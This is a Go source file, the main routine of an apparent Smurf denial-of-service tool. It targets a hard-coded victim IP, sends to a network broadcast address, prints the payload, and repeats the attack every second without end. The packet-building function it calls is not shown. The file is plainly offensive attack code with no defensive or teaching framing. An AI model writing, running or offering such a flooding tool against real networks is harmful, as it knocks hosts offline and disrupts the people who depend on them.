package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"time"
)

const banner = "Victim: %s\nICMP to: %s\nRun Every: %s\nPayload:\n---\n%v---\n"

func main() {
	victim := net.IP{192, 168, 1, 73}
	network := net.IP{192, 168, 1, 255}
	interval := time.Millisecond * 1000

	s, err := newSmurf(victim, network)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf(banner, victim, network, interval.String(), hex.Dump(s.payload))
	for {
		if err := s.execute(); err != nil {
			fmt.Printf("error: %s", err)
		}
		time.Sleep(interval)
	}
}
